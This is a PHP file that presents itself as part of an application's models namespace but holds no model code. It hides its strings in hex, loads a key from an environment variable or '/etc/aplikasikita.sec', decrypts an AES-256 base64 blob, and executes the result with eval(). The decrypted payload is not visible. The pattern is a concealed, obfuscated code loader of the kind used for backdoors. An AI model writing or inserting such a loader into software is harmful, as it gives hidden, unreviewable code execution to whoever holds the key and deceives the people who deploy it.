<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('MiyCwmhygjyUpZkZE13a0g==');

$c=base64_decode(

'nPuh2NXWVMQhfwP+k81eipwhNrlSMUfX5vv6PAbDrNSaYR+zmzFnTr2BNeKGuAoN/VOUBIMCzeY5' .
'i1QSlemJmx2wuOzAK2Eh0GGBWbCGOyfAMSgoiF4MczGdt21kJ/OAvfQFmeWg9tL1t+Mk7mQ0HzPZ' .
'T4SBH5U05WnAXU4qUXXFG6DvjVPlX2ueMKy5sRNnyFECtjag3w9f/MvysbQVYv7ThPCcRfWR+lAH' .
'lYJR9bOCykyFAAWvyn3sVhktugcLlwRSfvVjMYHdheNXeC0g+OkUrOf6zlQzM+wziicQv+5pL9zu' .
'KfXcvGsc16YHNpQ4R/BgWVfsV6HmAyL/dZ+zCaP2abRSMaGSO183ww3sFBBGkgUeKhbaFAJf8kTw' .
'tuGedwkWHwjyX01qmuu2+iRG0P5LagC9aE/gMWfkg4V+LTwSkDBQBnVIVT97J1NdQiAjqTP/BN+8' .
'JiBq4VHvKHWeyz7anP0FLOxNyH2LOIQrVvQaqUUzjveoNbIhNcJ3NTGdLOrNxYtFXK32gi0fczp4' .
'7KJkSeNK3+JR66WK+/p2D+jOzJubF1CyULKkuzmMbmoU+ZxpdGGqujyMx84TtJoCAARbUKLyRAFk' .
'38Vb7/tMCSRyhrAbOObBBx7L1+5V/MM0oz7oESMQJluMk2t613CXUN2suBT3Kqrm94D9lI07SbQs' .
'phu4jaWbH1s3ncMVvRAMfYTQAAW4eOQG7uB2etbcdiFhUj9yFada1obOahcSg2o0Go5sswqYBEw/' .
'GQFiiKW3grqSKIsFN7EzdXu3kzUtig=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

